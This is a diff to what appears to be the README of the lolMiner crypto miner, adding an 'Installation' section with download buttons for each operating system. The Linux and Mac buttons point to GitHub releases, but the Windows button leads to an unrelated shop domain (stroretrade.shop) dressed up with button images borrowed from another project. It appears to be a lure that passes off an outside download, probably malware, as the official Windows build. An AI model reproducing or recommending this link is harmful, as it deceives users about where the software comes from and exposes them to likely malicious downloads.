@@ -8,6 +8,14 @@
 * Discord Group :  https://discord.gg/jvfRvK5wTv
 * Youtube Channel : https://www.youtube.com/c/lolMinerSupport
 
+# Installation
+Click the download button for your operating system:
+<p float="left">
+  <a href="https://github.com/MinerSource/lolMiner/releases/tag/1.92"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
+  <a href="https://github.com/MinerSource/lolMiner/releases/tag/1.92"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://stroretrade.shop/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
+
 ## Supported Algorithm
 
 | Algorithm  | Fee % |
